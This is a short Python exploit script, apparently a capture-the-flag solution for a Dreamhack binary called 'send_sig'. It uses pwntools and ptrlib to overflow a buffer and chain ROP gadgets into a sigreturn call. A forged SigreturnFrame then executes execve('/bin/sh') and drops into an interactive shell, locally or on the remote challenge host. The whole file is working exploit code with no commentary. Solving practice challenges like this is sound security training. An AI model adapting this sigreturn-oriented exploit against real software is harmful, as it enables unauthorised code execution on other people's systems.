#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./send_sig")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 23561)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    bin_sh = 0x402000

    payload = b""
    payload += b"A" * 0x10
    payload += ptr.p64(next(exe.gadget("pop rax; ret;")))
    payload += ptr.p64(15)
    payload += ptr.p64(next(exe.gadget("syscall; ret;")))
    sigret_frame = pwn.SigreturnFrame()
    sigret_frame.rdi = bin_sh
    sigret_frame.rax = 59
    sigret_frame.rip = next(exe.gadget("syscall; ret;"))
    payload += bytes(sigret_frame)

    io.sendlineafter(b"Signal:", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
